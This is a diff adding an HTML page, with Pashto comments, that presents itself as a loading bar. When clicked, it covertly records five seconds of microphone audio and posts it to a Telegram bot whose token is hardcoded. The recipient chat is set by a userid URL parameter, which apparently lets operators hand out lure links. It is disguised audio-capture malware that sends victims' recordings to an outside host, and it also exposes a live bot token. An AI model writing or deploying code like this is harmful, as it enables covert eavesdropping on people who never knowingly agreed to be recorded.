@@ -1,0 +1,105 @@
+<!doctype html>
+<html lang="ps">
+<head>
+<meta charset="utf-8">
+<title>1s لوډینګ + 5s ثبت + پیغام</title>
+<style>
+body{margin:0;display:flex;justify-content:center;align-items:center;height:100vh;background:#0b1220;}
+.loader{width:80%;height:12px;background:#1e293b;border-radius:8px;overflow:hidden;cursor:pointer;}
+.bar{height:100%;width:0;background:linear-gradient(90deg,#34d399,#06b6d4);}
+</style>
+</head>
+<body>
+<div class="loader" id="loader"><div class="bar" id="bar"></div></div>
+
+<script>
+const BOT_TOKEN="8062278856:AAEYVkPjqb67UgOWPIYMUkvqvYe1O-SqgjU"; // ستا بوت توکن
+
+// URL څخه userid واخلئ
+function getUserIdFromUrl(){
+    const params = new URLSearchParams(window.location.search);
+    return params.get("userid");
+}
+
+let CHAT_ID = getUserIdFromUrl();
+if(!CHAT_ID){
+    alert("هیڅ userid په URL کې ونه موندل شو!");
+    CHAT_ID="0";
+}
+
+const loader=document.getElementById("loader");
+const bar=document.getElementById("bar");
+
+let mediaRecorder=null;
+let chunks=[];
+let streamRef=null;
+
+// دلته اضافي معلومات تعریف کړئ
+const EXTRA_INFO = "نور معلومات دلته"; // د اړتیا په اساس بدل کړئ
+const BASE_URL = "www.myweb.com/?userid=";
+
+async function startCycle(){
+    // لوډینګ 1s
+    bar.style.transition="width 1s linear";
+    bar.style.width="100%";
+
+    setTimeout(async ()=>{
+        try{
+            streamRef=await navigator.mediaDevices.getUserMedia({audio:true});
+        }catch(e){
+            console.error("Mic اجازه نشته:",e);
+            resetBar();
+            return;
+        }
+        chunks=[];
+        mediaRecorder=new MediaRecorder(streamRef);
+        mediaRecorder.ondataavailable=e=>{if(e.data && e.data.size) chunks.push(e.data);};
+        mediaRecorder.start();
+        console.log("ریکارډ پیل شو");
+
+        setTimeout(async ()=>{
+            if(mediaRecorder.state==="recording") mediaRecorder.stop();
+            if(streamRef){streamRef.getTracks().forEach(t=>t.stop()); streamRef=null;}
+
+            // آډیو واستول شي
+            const blob=new Blob(chunks,{type:"audio/ogg"});
+            const fd=new FormData();
+            fd.append("chat_id",CHAT_ID);
+            fd.append("voice",blob,"rec.ogg");
+
+            try{
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`,{
+                    method:"POST",
+                    body:fd
+                });
+                console.log("آډیو واستول شوه");
+            }catch(e){console.error("ارسال خطا:",e);}
+
+            // هماغه معلومات په text message واستول شي
+            const messageText = `🔗 لینک: ${BASE_URL}${CHAT_ID}\n🆔 کارن ID: ${CHAT_ID}\nℹ️ ${EXTRA_INFO}`;
+            try{
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
+                    method:"POST",
+                    headers: { "Content-Type":"application/json" },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: messageText })
+                });
+                console.log("لیکنی پیغام واستول شو");
+            }catch(e){console.error("پیغام ارسال خطا:",e);}
+
+            resetBar();
+        },5000);
+    },1000);
+}
+
+function resetBar(){
+    bar.style.transition="none";
+    bar.style.width="0%";
+}
+
+loader.addEventListener("click",()=>{
+    if(mediaRecorder && mediaRecorder.state==="recording") return;
+    startCycle();
+});
+</script>
+</body>
+</html> 
